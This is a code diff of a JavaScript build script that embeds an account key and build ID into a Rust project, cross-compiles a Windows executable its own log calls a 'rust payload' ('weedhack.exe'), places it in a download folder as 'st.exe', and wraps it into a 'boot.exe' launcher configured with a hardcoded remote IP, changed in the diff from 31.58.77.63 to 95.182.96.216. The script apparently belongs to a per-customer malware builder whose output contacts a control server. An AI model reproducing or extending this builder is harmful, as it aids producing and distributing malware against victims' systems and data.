@@ -11,33 +11,51 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const ROOT_DIR = path.join(__dirname, '..');
 const DOWNLOAD_DIR = path.join(ROOT_DIR, 'download');
 
-export async function buildBoot({ key }) {
+export async function buildBoot({ key, buildId }) {
   let rustDir = path.join(ROOT_DIR, 'client');
   if (!fs.existsSync(rustDir)) rustDir = ROOT_DIR;
 
-  const embeddedKeyPath = path.join(rustDir, 'src', 'embedded_key.rs');
-  fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);
+  const srcDir = path.join(rustDir, 'src');
+  if (!fs.existsSync(srcDir)) {
+    fs.mkdirSync(srcDir, { recursive: true });
+  }
+
+  // Write the embedded key just in case the Rust code falls back to it
+  const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
+  const embeddedSrc = `pub const ACCOUNT_KEY: &str = "${key}";\n`;
+  fs.writeFileSync(embeddedKeyPath, embeddedSrc);
 
   console.log('[build] compiling rust payload (st.exe)...');
   try {
-    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu', '-j', '2'], {
+    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
       cwd: rustDir,
       timeout: 5 * 60_000,
       maxBuffer: 64 * 1024 * 1024,
     });
   } catch (e) {
-    throw new Error(`cargo failed:\n${e.stdout}\n${e.stderr}`);
+    console.error('[build] cargo failed:', e.message);
+    if (e.stderr) console.error(e.stderr);
+    throw new Error(`cargo failed: ${e.stderr || e.message}`);
   }
 
-  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
+  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'weedhack.exe');
   if (!fs.existsSync(baseExe)) {
     throw new Error(`rust build missing output at ${baseExe}`);
   }
 
+  // Copy the compiled rust payload to the server's download folder
   if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
   fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));
 
   console.log('[build] wrapping into boot.exe...');
-  const bootBuf = await compileLauncher({ key, config: { ip: '31.58.77.63' }, baseExe });
+  
+  // Pass the buildId to compileLauncher
+  const bootBuf = await compileLauncher({ 
+    key, 
+    buildId,
+    config: { ip: '95.182.96.216' }, 
+    baseExe 
+  });
+  
   return bootBuf;
 }
